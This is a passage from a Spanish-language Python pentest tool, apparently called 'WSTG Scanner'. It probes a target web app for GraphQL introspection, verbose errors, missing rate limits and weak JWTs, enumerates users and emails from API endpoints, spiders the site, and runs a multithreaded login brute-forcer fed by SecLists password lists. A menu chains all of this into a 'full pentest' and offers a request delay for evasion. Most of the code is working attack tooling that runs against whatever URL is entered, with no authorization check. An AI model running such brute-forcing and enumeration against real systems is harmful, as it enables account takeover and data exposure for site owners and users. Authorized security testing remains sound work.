    """OWASP API8: Introspección GraphQL habilitada y queries peligrosas."""
    try:
        gql_endpoints = [urljoin(target, ep)
                         for ep in ('/graphql', '/graphiql', '/api/graphql', '/query', '/api/query')]
        introspection = {'query': '{ __schema { types { name } } }'}
        user_enum = {'query': '{ users { id username email password } }'}
        found_any = False
        for gql_url in gql_endpoints:
            try:
                resp = session.post(gql_url, json=introspection,
                                    headers={'Content-Type': 'application/json'},
                                    timeout=DEFAULT_TIMEOUT)
                if resp.status_code != 200:
                    continue
                data = resp.json()
                if 'data' in data and '__schema' in str(data.get('data', {})):
                    found_any = True
                    print_vuln(f"GraphQL Introspección habilitada: {gql_url}")
                    types = [t['name'] for t in data['data']['__schema']['types']
                             if not t['name'].startswith('__')]
                    print_info(f"  Tipos expuestos ({len(types)}): {', '.join(types[:15])}")
                elif 'errors' not in data:
                    found_any = True
                    print_warning(f"GraphQL activo (introspección deshabilitada): {gql_url}")
                if found_any:
                    try:
                        r2 = session.post(gql_url, json=user_enum,
                                          headers={'Content-Type': 'application/json'},
                                          timeout=DEFAULT_TIMEOUT)
                        d2 = r2.json()
                        if 'data' in d2 and d2['data'] and 'users' in str(d2['data']):
                            print_vuln(f"GraphQL expone listado de usuarios en {gql_url}")
                    except Exception:
                        pass
                    break
            except Exception:
                pass
        if not found_any:
            print_info("Sin endpoints GraphQL detectados o activos.")
    except Exception as e:
        print_error(f"Error en test GraphQL: {e}")


def test_api_verbose_errors(found_endpoints, session):
    """OWASP API7: Detecta respuestas de error con información interna expuesta."""
    try:
        error_payloads = ["'", '"', '{}', '-1', '../', '%00']
        sensitive_patterns = [
            re.compile(r'exception|traceback|stack.?trace|at \w+\.java:\d+', re.I),
            re.compile(r'sql(?:state)?|mysql|postgresql|sqlite|ora-\d{4,5}', re.I),
            re.compile(r'internal.?server.?error|unhandled.?exception|fatal.?error', re.I),
            re.compile(r'/var/www|c:\\\\inetpub|/home/\w+/|/etc/passwd', re.I),
        ]
        hits = 0
        for item in found_endpoints:
            if item['status'] not in (200, 0):
                continue
            url = item['url']
            for payload in error_payloads[:4]:
                test_url = url.rstrip('/') + payload
                try:
                    resp = session.get(test_url, timeout=DEFAULT_TIMEOUT)
                    if resp.status_code in (500, 503):
                        for pat in sensitive_patterns:
                            if pat.search(resp.text):
                                print_vuln(f"Error verbose [{resp.status_code}]: {test_url}")
                                hits += 1
                                break
                except Exception:
                    pass
        if hits == 0:
            print_info("Sin errores verbose detectados en los endpoints probados.")
    except Exception as e:
        print_error(f"Error en test verbose errors: {e}")


def test_api_rate_limiting(target, session):
    """OWASP API4: Verifica si existe rate limiting en endpoints de autenticación."""
    try:
        candidates = [
            urljoin(target, '/api/v1/login'),
            urljoin(target, '/api/login'),
            urljoin(target, '/api/auth'),
            urljoin(target, '/login'),
        ]
        for test_url in candidates:
            statuses = []
            for _ in range(20):
                try:
                    resp = session.post(test_url,
                                        json={'username': 'test', 'password': 'test'},
                                        timeout=DEFAULT_TIMEOUT)
                    statuses.append(resp.status_code)
                    if resp.status_code == 429:
                        break
                except Exception:
                    break
            if not statuses:
                continue
            if 429 in statuses:
                print_good(f"Rate limiting activo (HTTP 429) en {test_url}")
            elif all(s not in (429, 503) for s in statuses):
                print_warning(f"Sin rate limiting: {len(statuses)} requests sin bloqueo en {test_url}")
            break
    except Exception as e:
        print_error(f"Error en test rate limiting: {e}")


def test_jwt_tokens(target, session):
    """OWASP API2: Detecta JWT en cabeceras/cookies y analiza algoritmo y campos."""
    try:
        resp = session.get(target, timeout=DEFAULT_TIMEOUT)
        jwt_regex = re.compile(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*')
        jwt_candidates = set()
        for header_val in resp.headers.values():
            jwt_candidates.update(jwt_regex.findall(header_val))
        for cookie in resp.cookies:
            jwt_candidates.update(jwt_regex.findall(cookie.value))
        if not jwt_candidates:
            print_info("Sin JWT detectados en cabeceras/cookies de la página principal.")
            return
        for jwt in jwt_candidates:
            try:
                parts = jwt.split('.')
                if len(parts) < 3:
                    continue
                def _b64_decode(s):
                    s += '=' * (4 - len(s) % 4)
                    return json.loads(base64.urlsafe_b64decode(s).decode('utf-8', errors='ignore'))
                header_data = _b64_decode(parts[0])
                payload_data = _b64_decode(parts[1])
                alg = header_data.get('alg', '').upper()
                print_info(f"JWT detectado — alg: {alg}  kid: {header_data.get('kid', 'N/A')}")
                if alg in ('NONE', ''):
                    print_vuln("JWT con alg:none — firma ignorada completamente")
                elif alg in ('HS256', 'HS384', 'HS512'):
                    print_warning(f"JWT HMAC ({alg}) — revisar secreto débil manualmente")
                sensitive_keys = {'admin', 'role', 'is_admin', 'permission', 'privilege', 'scope'}
                exposed = [k for k in payload_data if k.lower() in sensitive_keys]
                if exposed:
                    print_warning(f"  JWT contiene campos de privilegio: {exposed}")
                    for k in exposed:
                        print_info(f"    {k} = {payload_data[k]}")
                exp = payload_data.get('exp')
                if exp and exp < time.time():
                    print_warning("  JWT caducado todavía aceptado por el servidor")
            except Exception:
                pass
    except Exception as e:
        print_error(f"Error en test JWT: {e}")



def enumerate_users_from_endpoints(target, session):
    try:
        users = []
        emails = []
        endpoints_to_try = ["/api/users", "/users", "/rest/users", "/api/user/list", "/admin/users"]
        for endpoint in endpoints_to_try:
            url = urljoin(target, endpoint)
            try:
                resp = session.get(url, timeout=DEFAULT_TIMEOUT)
                if resp.status_code == 200:
                    try:
                        data = resp.json()
                        if isinstance(data, list):
                            for item in data:
                                if 'username' in item: users.append(item['username'])
                                if 'email' in item: emails.append(item['email'])
                        elif isinstance(data, dict):
                            for key, val in data.items():
                                if key.lower() in ['users','items'] and isinstance(val, list):
                                    for item in val:
                                        if 'username' in item: users.append(item['username'])
                                        if 'email' in item: emails.append(item['email'])
                    except:
                        emails.extend(re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', resp.text))
            except:
                pass
        return list(set(users)), list(set(emails))
    except Exception as e:
        print_error(f"Error enumerando usuarios: {e}")
        return [], []

def test_user_enumeration_form(target, session):
    try:
        print_info("Comprobando posible enumeración de usuarios en formularios...")
        resp = session.get(target, timeout=DEFAULT_TIMEOUT)
        if HAS_BS4:
            soup = BeautifulSoup(resp.text, 'html.parser')
            for form in soup.find_all('form'):
                action = form.get('action')
                method = form.get('method', 'get').upper()
                if method != 'POST':
                    continue
                inputs = {inp.get('name'): inp for inp in form.find_all('input') if inp.get('name')}
                user_field = None
                for name in inputs:
                    if 'user' in name.lower() or 'email' in name.lower():
                        user_field = name
                        break
                if user_field:
                    form_url = urljoin(target, action) if action else target
                    data = {user_field: 'nonexistent_user_xyz_999'}
                    if 'pass' in str(inputs):
                        data['password'] = 'dummy'
                    resp_test = session.post(form_url, data=data, timeout=DEFAULT_TIMEOUT)
                    if "user not found" in resp_test.text.lower() or "no existe" in resp_test.text.lower():
                        print_vuln("Posible enumeración de usuarios detectada (mensaje diferencial)")
    except Exception as e:
        print_error(f"Error en test de enumeración: {e}")

def bruteforce_login(target, session, usernames, passlist, max_threads=5):
    """
    Detecta formularios de login y realiza fuerza bruta.
    Muestra progreso y resultado final sin duplicados.
    """
    try:
        if not usernames:
            usernames = ['admin', 'test']
        
        login_forms = []
        urls_to_check = [target] + [urljoin(target, path) for path in LOGIN_PATHS]
        
        for page_url in urls_to_check:
            try:
                resp = session.get(page_url, timeout=DEFAULT_TIMEOUT)
                if resp.status_code != 200:
                    continue
                if HAS_BS4:
                    soup = BeautifulSoup(resp.text, 'html.parser')
                    forms = soup.find_all('form')
                    for form in forms:
                        action = form.get('action')
                        method = form.get('method', 'get').upper()
                        if method != 'POST':
                            continue
                        inputs = form.find_all(['input', 'textarea'])
                        user_field = None
                        pass_field = None
                        for inp in inputs:
                            name = inp.get('name', '').lower()
                            if 'user' in name or 'email' in name or 'login' in name or 'username' in name:
                                user_field = inp.get('name')
                            if 'pass' in name or 'password' in name:
                                pass_field = inp.get('name')
                        if user_field and pass_field:
                            form_url = urljoin(page_url, action) if action else page_url
                            login_forms.append({
                                'url': form_url,
                                'user_field': user_field,
                                'pass_field': pass_field
                            })
                            print_good(f"Formulario de login detectado en {form_url} (usuario: {user_field}, pass: {pass_field})")
            except:
                continue
        
        if not login_forms:
            print_warning("No se detectaron formularios de login automáticamente.")
            manual = input("¿Deseas introducir los datos manualmente? (s/n): ").strip().lower()
            if manual == 's':
                login_url = input("URL completa del formulario de login: ").strip()
                user_field = input("Nombre del campo de usuario: ").strip()
                pass_field = input("Nombre del campo de contraseña: ").strip()
                if login_url and user_field and pass_field:
                    login_forms.append({
                        'url': normalize_url(login_url),
                        'user_field': user_field,
                        'pass_field': pass_field
                    })
                    print_good("Formulario manual agregado.")
                else:
                    print_error("Datos incompletos. No se realizará bruteforce.")
                    return
            else:
                print_info("Continuando sin bruteforce.")
                return
        
        # Cargar lista de contraseñas
        passwords = DEFAULT_PASSWORDS
        if passlist and os.path.isfile(passlist):
            with open(passlist, 'r') as f:
                passwords = [line.strip() for line in f if line.strip()]
        elif passlist:
            print_warning(f"No se pudo leer {passlist}, usando lista por defecto.")
        else:
            # Si no se proporcionó wordlist, intentar usar la de SecLists
            if os.path.exists(SECLISTS_PASSWORDS):
                print_info(f"Usando wordlist de contraseñas por defecto: {SECLISTS_PASSWORDS}")
                with open(SECLISTS_PASSWORDS, 'r') as f:
                    passwords = [line.strip() for line in f if line.strip()]
            else:
                print_warning("No se encontró la wordlist de SecLists, usando lista pequeña por defecto.")
        
        total_combinations = len(usernames) * len(passwords)
        print_info(f"Iniciando bruteforce con {len(usernames)} usuarios y {len(passwords)} contraseñas (total {total_combinations} combinaciones)...")
        
        found_credentials = set()  # Usar set para evitar duplicados
        
        def is_successful_login(response, form_url):
            """Determina si la respuesta indica un login exitoso."""
            # Redirección a página de dashboard, home, etc.
            if response.status_code == 302:
                location = response.headers.get('Location', '').lower()
                if any(x in location for x in ['dashboard', 'home', 'admin', 'profile', 'account']):
                    return True
            # Contenido de la respuesta
            content = response.text.lower()
            success_indicators = [
                'dashboard', 'welcome', 'logged in', 'login successful',
                'redirect', 'profile', 'my account', 'logout'
            ]
            if any(indicator in content for indicator in success_indicators):
                return True
            # Comparar tamaño de respuesta con un intento fallido (heurística)
            # (Esto es más complejo, lo dejamos como opción)
            return False
        
        def try_cred(user, pwd):
            for form in login_forms:
                data = {form['user_field']: user, form['pass_field']: pwd}
                try:
                    if REQUEST_DELAY > 0:
                        time.sleep(REQUEST_DELAY)
                    # Primero con allow_redirects=False para capturar redirecciones
                    resp = session.post(form['url'], data=data, timeout=DEFAULT_TIMEOUT, allow_redirects=False)
                    if is_successful_login(resp, form['url']):
                        found_credentials.add((user, pwd))
                        return True
                    # Si no, seguir la redirección y comprobar el contenido final
                    resp2 = session.post(form['url'], data=data, timeout=DEFAULT_TIMEOUT, allow_redirects=True)
                    if is_successful_login(resp2, form['url']):
                        found_credentials.add((user, pwd))
                        return True
                except:
                    pass
            return False
        
        if HAS_TQDM:
            with tqdm(total=total_combinations, desc="Bruteforce", unit="comb", ncols=80) as pbar:
                with ThreadPoolExecutor(max_workers=max_threads) as executor:
                    futures = []
                    for user in usernames:
                        for pwd in passwords:
                            futures.append(executor.submit(try_cred, user, pwd))
                    for future in as_completed(futures):
                        future.result()
                        pbar.update(1)
        else:
            completed = 0
            with ThreadPoolExecutor(max_workers=max_threads) as executor:
                futures = []
                for user in usernames:
                    for pwd in passwords:
                        futures.append(executor.submit(try_cred, user, pwd))
                for future in as_completed(futures):
                    completed += 1
                    if completed % 100 == 0 or completed == total_combinations:
                        print_info(f"Progreso bruteforce: {completed}/{total_combinations} combinaciones probadas")
                    future.result()
        
        if found_credentials:
            print_good(f"Bruteforce completado. Credenciales encontradas: {len(found_credentials)}")
            for user, pwd in found_credentials:
                print_vuln(f"  {user}:{pwd}")
        else:
            print_info("Bruteforce completado. No se encontraron credenciales válidas.")
    except Exception as e:
        print_error(f"Error en bruteforce: {e}")

def spider_website(target, session, max_pages=500, max_depth=3, use_robots=True):
    print_info(f"Iniciando spidering en {target} (máx páginas: {max_pages}, profundidad: {max_depth})")
    base_parsed = urlparse(target)
    base_domain = base_parsed.netloc

    robots_parser = None
    if use_robots:
        robots_url = urljoin(target, "/robots.txt")
        try:
            rp = RobotFileParser()
            rp.set_url(robots_url)
            rp.read()
            robots_parser = rp
            print_info("robots.txt cargado correctamente.")
        except:
            print_warning("No se pudo cargar robots.txt, continuando sin restricciones.")

    visited = set()
    urls_queue = deque()
    urls_queue.append((target, 0))
    discovered_urls = set()
    all_params = set()
    forms_found = []
    discovered_urls.add(target)
    
    with tqdm(total=max_pages, desc="Spidering", unit="pág", ncols=80, disable=not HAS_TQDM) as pbar:
        while urls_queue and len(visited) < max_pages:
            current_url, depth = urls_queue.popleft()
            if current_url in visited:
                continue
            if depth > max_depth:
                continue
            visited.add(current_url)
            if HAS_TQDM:
                pbar.update(1)
                pbar.set_postfix({"Actual": os.path.basename(current_url)[:30], "Desc": len(discovered_urls)})
            else:
                if len(visited) % 20 == 0:
                    print_info(f"Spidering progreso: {len(visited)} páginas visitadas, {len(discovered_urls)} URLs descubiertas")
            
            try:
                resp = session.get(current_url, timeout=DEFAULT_TIMEOUT)
                if resp.status_code != 200:
                    continue
                content_type = resp.headers.get('Content-Type', '')
                if 'text/html' not in content_type:
                    continue
                
                if HAS_BS4:
                    soup = BeautifulSoup(resp.text, 'html.parser')
                    for link in soup.find_all('a', href=True):
                        href = link['href'].strip()
                        if not href or href.startswith('#') or href.startswith('javascript:'):
                            continue
                        absolute = urljoin(current_url, href)
                        parsed_abs = urlparse(absolute)
                        if parsed_abs.netloc != base_domain:
                            continue
                        clean_abs = parsed_abs._replace(fragment='')
                        abs_url = urlunparse(clean_abs)
                        if use_robots and robots_parser and not robots_parser.can_fetch("*", abs_url):
                            continue
                        if abs_url not in discovered_urls:
                            discovered_urls.add(abs_url)
                            urls_queue.append((abs_url, depth+1))
                    
                    for form in soup.find_all('form'):
                        action = form.get('action', '')
                        method = form.get('method', 'get').upper()
                        if action:
                            form_url = urljoin(current_url, action)
                            parsed_f = urlparse(form_url)
                            if parsed_f.netloc == base_domain:
                                clean_f = parsed_f._replace(fragment='')
                                f_url = urlunparse(clean_f)
                                if f_url not in discovered_urls:
                                    discovered_urls.add(f_url)
                                    urls_queue.append((f_url, depth+1))
                        for inp in form.find_all(['input', 'textarea']):
                            name = inp.get('name')
                            if name:
                                all_params.add(name)
                        forms_found.append({'url': current_url, 'action': action, 'method': method})
                    
                    for u in list(discovered_urls):
                        parsed_u = urlparse(u)
                        if parsed_u.query:
                            for key in parse_qs(parsed_u.query).keys():
                                all_params.add(key)
                else:
                    hrefs = re.findall(r'href=["\'](.*?)["\']', resp.text)
                    for href in hrefs:
                        if href and not href.startswith('#') and not href.startswith('javascript:'):
                            absolute = urljoin(current_url, href)
                            parsed_abs = urlparse(absolute)
                            if parsed_abs.netloc != base_domain:
                                continue
                            if absolute not in discovered_urls:
                                discovered_urls.add(absolute)
                                urls_queue.append((absolute, depth+1))
            except Exception as e:
                print_error(f"Error spidering {current_url}: {e}")
                continue
    
    print_good(f"Spidering completado. Páginas visitadas: {len(visited)}, URLs únicas descubiertas: {len(discovered_urls)}")
    if all_params:
        print_info(f"Parámetros únicos encontrados: {len(all_params)} -> {', '.join(list(all_params)[:20])}")
    if forms_found:
        print_info(f"Formularios detectados durante el spidering: {len(forms_found)}")
    return discovered_urls, all_params, forms_found

# ========== MENÚ PRINCIPAL ==========
def show_menu():
    clear_screen()
    if HAS_COLOR:
        print(Fore.CYAN + BANNER + Style.RESET_ALL)
        print(Fore.CYAN + DESCRIPTION + Style.RESET_ALL)
        print(Fore.GREEN + DEVELOPER + Style.RESET_ALL + "\n")
    else:
        print(DESCRIPTION)
        print(BANNER)
        print(DEVELOPER + "\n")
    auth_status = (f"{Fore.GREEN}[Autenticado]{Style.RESET_ALL}" if AUTHENTICATED
                   else f"{Fore.YELLOW}[Sin autenticación]{Style.RESET_ALL}")
    print("=" * 52)
    print(f"  WSTG SCANNER v{VERSION}  {auth_status}")
    print("=" * 52)
    print(" 1. Información general y enumeración")
    print(" 2. Fuzzing de directorios (usa ffuf si está instalado)")
    print(" 3. Pruebas de inyección (SQLi, XSS, Path Traversal, Command Injection)")
    print(" 4. Pruebas de API (descubrimiento, IDOR, mass assignment)")
    print(" 5. Enumeración de usuarios/emails y fuerza bruta de contraseñas")
    print(" 6. Spidering / Mapeo completo del sitio")
    print(" 7. PENTESTING COMPLETO (ejecuta todas las pruebas anteriores)")
    print(" 8. Configurar autenticación (login)")
    print(" 9. Salir")
    print("="*50)

def run_information_gathering(target, session):
    print_info("=== RECOLECTANDO INFORMACIÓN GENERAL ===")
    info = safe_execute(gather_info, target, session)
    if info:
        print_info(f"Servidor: {info['server']}")
        print_info(f"Tecnologías: {', '.join(info['technologies'])}")
        safe_execute(check_robots_sitemap, target, session)
        safe_execute(check_http_methods, target, session)
        safe_execute(check_security_headers, info['headers'])
        safe_execute(check_cookie_security, info['cookies'])
        resp = safe_execute(session.get, target, timeout=DEFAULT_TIMEOUT)
        if resp:
            safe_execute(check_info_disclosure, resp.text)
        safe_execute(check_directory_listing, target, session)
        safe_execute(check_ssl_tls, target)
        safe_execute(test_cors_advanced, target, session)

def run_directory_fuzzing(target, session):
    print_info("=== FUZZING DE DIRECTORIOS ===")
    use_default = input("¿Usar wordlist por defecto (SecLists small)? [S/n]: ").strip().lower()
    wordlist = None
    if use_default == 'n':
        custom_wl = input("Ruta a wordlist personalizada: ").strip()
        if custom_wl:
            wordlist = custom_wl
        else:
            print_warning("No se proporcionó wordlist. Usando lista interna.")
    if check_ffuf():
        use_ffuf = input("¿Usar ffuf para fuzzing? (recomendado) [S/n]: ").strip().lower() != 'n'
    else:
        use_ffuf = False
        print_warning("ffuf no está instalado. Usando método interno.")
    dir_bruteforce(target, session, wordlist=wordlist, threads=THREADS, use_ffuf=use_ffuf)

def run_injection_tests(target, session):
    print_info("=== PRUEBAS DE INYECCIÓN AVANZADAS ===")
    forms, url_params = safe_execute(extract_forms_and_params, target, session)
    if not forms and not url_params:
        print_warning("No se encontraron parámetros ni formularios para probar.")
        return
    if url_params:
        print_info(f"Probando {len(url_params)} parámetros GET...")
        for param in url_params:
            safe_execute(advanced_injection_tests, target, param, session, 'GET')
            safe_execute(test_path_traversal, target, param, session, 'GET')
            safe_execute(test_open_redirect, target, param, session, 'GET')
    if forms:
        print_info(f"Probando {len(forms)} formularios...")
        for form in forms:
            action = form['action']
            method = form['method']
            inputs = form['inputs']
            form_url = urljoin(target, action) if action else target
            for inp in inputs:
                if method == 'POST':
                    safe_execute(advanced_injection_tests, form_url, inp, session, 'POST')
                    safe_execute(test_path_traversal, form_url, inp, session, 'POST')
                    safe_execute(test_open_redirect, form_url, inp, session, 'POST')
                else:
                    safe_execute(advanced_injection_tests, form_url, inp, session, 'GET')
                    safe_execute(test_path_traversal, form_url, inp, session, 'GET')
                    safe_execute(test_open_redirect, form_url, inp, session, 'GET')

def run_api_tests(target, session):
    print_info("=== PRUEBAS DE API (OWASP API Top 10) ===")
    print_info("[1/7] Descubrimiento de endpoints...")
    found = safe_execute(discover_api_endpoints, target, session) or []
    print_info("[2/7] CORS avanzado...")
    safe_execute(test_cors_advanced, target, session)
    print_info("[3/7] GraphQL introspección...")
    safe_execute(test_graphql, target, session)
    print_info("[4/7] JWT & autenticación...")
    safe_execute(test_jwt_tokens, target, session)
    if found:
        print_info("[5/7] IDOR / BOLA...")
        safe_execute(test_api_idor, found, session)
        print_info("[6/7] Mass Assignment...")
        safe_execute(test_api_mass_assignment, found, session)
        print_info("[7/7] Errores verbose + Auth bypass...")
        safe_execute(test_api_verbose_errors, found, session)
        safe_execute(test_api_auth_bypass, found, session)
    else:
        print_info("[5-7/7] Saltando tests de endpoints (ninguno encontrado).")
    safe_execute(test_api_rate_limiting, target, session)
    print_good("Pruebas de API completadas.")

def run_user_enum_bruteforce(target, session):
    print_info("=== ENUMERACIÓN DE USUARIOS Y BRUTEFORCE ===")
    users, emails = safe_execute(enumerate_users_from_endpoints, target, session)
    if users:
        print_good(f"Usuarios encontrados: {', '.join(users)}")
    if emails:
        print_good(f"Emails encontrados: {', '.join(emails)}")
    safe_execute(test_user_enumeration_form, target, session)
    want_brute = input("¿Desea realizar fuerza bruta de contraseñas? (s/n): ").strip().lower()
    if want_brute == 's':
        passlist = input("Ruta a wordlist de contraseñas (dejar vacío para usar por defecto de SecLists): ").strip()
        if not users:
            users_input = input("Introduce usuarios separados por comas: ").strip()
            if users_input:
                users = [u.strip() for u in users_input.split(',') if u.strip()]
            else:
                users = ['admin', 'test']
        safe_execute(bruteforce_login, target, session, users, passlist if passlist else None)

def run_spider(target, session):
    print_info("=== SPIDERING / MAPEO COMPLETO DEL SITIO ===")
    max_pages = input("Máximo número de páginas a rastrear (default 500): ").strip()
    if not max_pages:
        max_pages = 500
    else:
        max_pages = int(max_pages)
    max_depth = input("Profundidad máxima de rastreo (default 3): ").strip()
    if not max_depth:
        max_depth = 3
    else:
        max_depth = int(max_depth)
    use_robots = input("¿Respetar robots.txt? [S/n]: ").strip().lower() != 'n'
    urls, params, forms = spider_website(target, session, max_pages=max_pages, max_depth=max_depth, use_robots=use_robots)
    print_good(f"Total URLs descubiertas: {len(urls)}")
    if params:
        print_info(f"Parámetros únicos encontrados: {len(params)}")
    save = input("¿Guardar lista de URLs en un archivo? (s/n): ").strip().lower()
    if save == 's':
        filename = input("Nombre del archivo (default: spider_output.txt): ").strip()
        if not filename:
            filename = "spider_output.txt"
        with open(filename, 'w') as f:
            for url in sorted(urls):
                f.write(url + '\n')
        print_good(f"URLs guardadas en {filename}")

def run_full_pentest(target, session):
    print_info("=== INICIANDO PENTESTING COMPLETO ===")
    run_information_gathering(target, session)
    run_spider(target, session)
    run_directory_fuzzing(target, session)
    run_injection_tests(target, session)
    run_api_tests(target, session)
    run_user_enum_bruteforce(target, session)
    print_good("Pentesting completo finalizado.")

def main():
    global TARGET_URL, AUTHENTICATED, AUTH_SESSION, THREADS, DEFAULT_TIMEOUT, REQUEST_DELAY, OUTPUT_FILE

    parser = argparse.ArgumentParser(
        description=f"WSTG Scanner v{VERSION} - OWASP Web Security Testing Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="Ejemplo: python3 wstg-scanner.py --url https://example.com --output report.txt"
    )
    parser.add_argument('--url', '-u', metavar='URL',
                        help='URL objetivo (omitir para modo interactivo)')
    parser.add_argument('--output', '-o', metavar='FILE',
                        help='Archivo de salida para el reporte (ej: report.txt)')
    parser.add_argument('--threads', '-t', type=int, default=THREADS, metavar='N',
                        help=f'Número de hilos (default: {THREADS})')
    parser.add_argument('--timeout', type=int, default=DEFAULT_TIMEOUT, metavar='S',
                        help=f'Timeout por request en segundos (default: {DEFAULT_TIMEOUT})')
    parser.add_argument('--delay', '-d', type=float, default=0.0, metavar='S',
                        help='Delay entre requests en segundos para evasión (default: 0)')
    parser.add_argument('--no-color', action='store_true',
                        help='Desactivar colores en la salida')
    parser.add_argument('--version', '-V', action='version', version=f'WSTG Scanner v{VERSION}')
    args = parser.parse_args()

    THREADS = args.threads
    DEFAULT_TIMEOUT = args.timeout
    REQUEST_DELAY = args.delay
    OUTPUT_FILE = args.output

    if args.no_color:
        global HAS_COLOR
        HAS_COLOR = False

    clear_screen()
    if HAS_COLOR:
        print(Fore.CYAN + BANNER + Style.RESET_ALL)
        print(Fore.CYAN + DESCRIPTION + Style.RESET_ALL)
        print(Fore.GREEN + DEVELOPER + Style.RESET_ALL + "\n")
    else:
        print(BANNER)
        print(DESCRIPTION)
        print(DEVELOPER + "\n")

    if args.url:
        TARGET_URL = normalize_url(args.url)
        print_info(f"Objetivo: {TARGET_URL}")
    else:
        TARGET_URL = input("Introduce la URL objetivo: ").strip()
        TARGET_URL = normalize_url(TARGET_URL)
        print_info(f"Objetivo: {TARGET_URL}")

    session = get_session()

    while True:
        show_menu()
        option = input("Selecciona una opción: ").strip()
        try:
            if option == '1':
                run_information_gathering(TARGET_URL, session)
            elif option == '2':
                run_directory_fuzzing(TARGET_URL, session)
            elif option == '3':
                run_injection_tests(TARGET_URL, session)
            elif option == '4':
                run_api_tests(TARGET_URL, session)
            elif option == '5':
                run_user_enum_bruteforce(TARGET_URL, session)
            elif option == '6':
                run_spider(TARGET_URL, session)
            elif option == '7':
                run_full_pentest(TARGET_URL, session)
            elif option == '8':
                setup_authentication()
                if AUTHENTICATED:
                    session = AUTH_SESSION
                    print_good("Sesión autenticada activa para futuras pruebas.")
                else:
                    print_warning("No se pudo autenticar. Continuando sin autenticación.")
            elif option == '9':
                print_info("Saliendo...")
                break
            else:
                print_error("Opción no válida. Intenta de nuevo.")
        except KeyboardInterrupt:
            print("\n")
            print_warning("Interrupción detectada. Saliendo...")
            break
        except Exception as e:
            print_error(f"Error inesperado: {e}")

        input("\nPresiona Enter para continuar...")

    if FINDINGS:
        auto_save = OUTPUT_FILE is not None
        if not auto_save:
            auto_save = input(
                f"\n¿Guardar reporte con {len(FINDINGS)} hallazgos? [S/n]: "
            ).strip().lower() != 'n'
        if auto_save:
            save_report(OUTPUT_FILE)

    print("\n" + Fore.GREEN + "Happy Hacking :)" + Style.RESET_ALL)
    sys.exit(0)

if __name__ == "__main__":
    main()
